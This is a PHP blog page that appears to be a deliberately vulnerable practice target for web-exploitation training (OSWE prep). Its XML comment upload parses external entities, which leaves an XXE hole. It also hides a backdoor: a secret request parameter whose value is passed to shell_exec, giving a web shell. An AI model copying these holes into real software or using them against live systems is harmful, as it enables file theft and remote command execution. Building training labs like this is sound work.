<?php
include("isAdmin.php");
include("header.php");
?> <!-- contains the header.php + isAdmin.php code (cleaner code) -->

        <!-- Page content-->
        <div class="container mt-5">
            <div class="row">
                <div class="col-lg-8">
                    <!-- Post content-->
                    <article>
                        <!-- Post header-->
                        <header class="mb-4">
                            <!-- Post title-->
                            <h1 class="fw-bolder mb-1">Welcome to SecAura's Blog! (OSWE PREP)</h1>
                            <!-- Post meta content-->
                            <div class="text-muted fst-italic mb-2">Like and Subscribe!</div>
                            <!-- Post categories-->
                            <a class="badge bg-secondary text-decoration-none link-light" href="#!">Web Design</a>
                            <a class="badge bg-secondary text-decoration-none link-light" href="#!">Freebies</a>
                        </header>
                        <!-- Preview image figure-->
                        <figure class="mb-4"><img class="img-fluid rounded" src="banner.PNG" alt="..." /></figure>
                    </article>
                    <!-- Comments section-->
                    <section class="mb-5">
                        <div class="card bg-light">
                            <div class="card-body">


                            <h1>Upload comment to page </h1>
                            <h4><i>(still need to add MYSQL backend)</i></h4>
                                <!-- Comment form-->
                                <form action="upload.php" method="post" enctype="multipart/form-data">
                                    Select image to upload:
                                    <input class="form-control" type="file" name="comments" id="comments">
                                    <input class="form-control btn-primary" type="submit" value="Upload Image" name="submit">
                                    </form>

                                    
                                
                                <h3>Acceptable XML code looks like</h3>
                                <xmp >
                                <comments>
                                    <name>SecAura</name>
                                    <comment>Please Subscribe</comment>
                                </comments>
                                </xmp >
                                    
                                    <?php

                                    if (isset($_FILES["comments"]) && $_FILES['comments']['size'] > 0 && $_FILES['comments']['error'] == 0){


                                    libxml_disable_entity_loader (false);
                                    $xmlfile = file_get_contents($_FILES["comments"]['tmp_name']);
                                    $dom = new DOMDocument();
                                    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
                                    $comments = simplexml_import_dom($dom);
                                    $name = $comments->name;
                                    $comment = $comments->comment; 
                                    echo "Name: ". $name . "<br>Comment:" . $comment;

                                    }else{
                                        echo "upload error";
                                    }


                                    //Some functionality that isnt known to the user
                                    if (isset($_REQUEST['debugcommandLineParameter']) && $_REQUEST['debugcommandSecret'] == "Subscribe2SecAura:)"){
                                        echo"<br><pre>";
                                        echo shell_exec($_REQUEST['debugcommandLineParameter']);
                                        echo "</pre>";
                                    }


                                    ?>
                                  
                            </div>
                        </div>
                    </section>
                </div>



<?php include("footer.php");?><!-- contains the footer.php code (cleaner code) -->
